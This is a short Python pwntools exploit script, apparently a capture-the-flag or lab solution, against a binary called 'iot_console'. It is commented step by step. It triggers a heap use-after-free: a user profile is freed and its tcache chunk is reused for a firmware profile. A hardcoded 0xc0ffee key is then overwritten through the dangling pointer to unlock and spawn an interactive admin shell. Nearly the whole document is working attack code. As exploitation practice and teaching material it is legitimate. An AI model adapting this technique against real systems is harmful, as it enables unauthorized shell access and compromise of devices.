from pwn import *

fileName = './iot_console'
context.binary = fileName
e = ELF(fileName)
## .got + .sym + .plt are all valid methods to get an address
#putsAdd = e.got['puts']



## to test locally use process, otherwise remote in 
p = process(fileName)
context.terminal = ['ptyxis', '--', 'sh', '-c']
# for use with gdb
#p = gdb.debug(fileName, gdbscript='''r''',env={"SHELL": "/bin/sh"})
#p = remote(ip,port)



p.recvuntil(b'Select:')

"""  
This block allocates a user profile on the heap of size 104
"""
p.sendline(b'3') # Create profile
p.sendline(b'1') 
p.sendline(b'Apple') # profile name
p.sendline(b'Apple') # profile email
p.sendline(b'Apple') # profile role
p.sendline()

""" 
This block then deletes that profile, freeing the heap memory but leaving the pointer to it dangling for later use
"""
p.sendline(b'5') # delete profile
p.sendline()
p.sendline(b'0')

""" 
This block then creates a firmware profile, which allocates a new chunk of memory (size 104) on the heap,
and due to the way tcache bins works, it will reuse the same chunk of memory that was just freed by the previous block, 
which is where the dangling pointer is pointing to.
"""
p.sendline(b'5') # firmware ops
p.sendline(b'1') # initialize firmware
p.sendline()

"""  
This block then edits the username of the user profile, which is still pointing to the same chunk of memory that was just allocated 
for the firmware profile, and overwrites it with the correct key to grant a shell / admin mode
"""
p.sendline(b'0')
p.sendline(b'3') 
p.sendline(b'3') # Edit username / overwrite the key
p.sendline(b'\xee\xff\xc0\x00') # coffee is the hardcoded value the code looks for
p.sendline()

p.sendline(b'0')
p.sendline(b'8') # activate shell



p.interactive()
